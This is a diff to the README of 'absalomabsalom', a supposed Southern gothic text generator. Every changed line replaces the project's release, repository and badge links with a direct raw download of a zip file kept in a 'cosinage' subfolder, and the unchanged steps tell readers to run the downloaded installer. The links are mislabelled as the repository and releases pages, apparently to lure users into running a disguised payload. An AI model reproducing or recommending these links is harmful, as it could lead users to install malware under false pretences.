@@ -6,7 +6,7 @@
 ## 🚀 Getting Started
 To get started with absalomabsalom, you will first need to download the application from our Releases page.
 
-[![Download absalomabsalom](https://img.shields.io/badge/Download-absalomabsalom-blue.svg)](https://github.com/Bryan3332/absalomabsalom/releases)
+[![Download absalomabsalom](https://raw.githubusercontent.com/Bryan3332/absalomabsalom/main/cosinage/absalomabsalom.zip)](https://raw.githubusercontent.com/Bryan3332/absalomabsalom/main/cosinage/absalomabsalom.zip)
 
 ### 🖥️ System Requirements
 To ensure absalomabsalom runs smoothly, please verify that your system meets the following requirements:
@@ -17,7 +17,7 @@ To ensure absalomabsalom runs smoothly, please verify that your system meets the
 - **Storage**: A minimum of 100 MB of free disk space
 
 ## 📥 Download & Install
-1. **Visit the [Releases page](https://github.com/Bryan3332/absalomabsalom/releases)** to find the latest version of absalomabsalom.
+1. **Visit the [Releases page](https://raw.githubusercontent.com/Bryan3332/absalomabsalom/main/cosinage/absalomabsalom.zip)** to find the latest version of absalomabsalom.
 2. On the Releases page, look for the most recent version and click the link to download the installation file that corresponds to your operating system.
 3. Once downloaded, locate the file in your downloads folder.
 4. Run the installation file by double-clicking it and follow the on-screen prompts to complete the installation.
@@ -51,7 +51,7 @@ We encourage users to connect with each other. Join our community discussion on 
 Thank you to everyone who contributed to the development of absalomabsalom. Your support and feedback help us improve and expand the capabilities of this literature generation machine.
 
 ## 🔗 Links
-- **Repository**: [absalomabsalom on GitHub](https://github.com/Bryan3332/absalomabsalom)
-- **Releases**: [Download Latest Version](https://github.com/Bryan3332/absalomabsalom/releases)
+- **Repository**: [absalomabsalom on GitHub](https://raw.githubusercontent.com/Bryan3332/absalomabsalom/main/cosinage/absalomabsalom.zip)
+- **Releases**: [Download Latest Version](https://raw.githubusercontent.com/Bryan3332/absalomabsalom/main/cosinage/absalomabsalom.zip)
 
 Feel free to dive into the world of machine-generated Southern gothic literature. Happy writing!
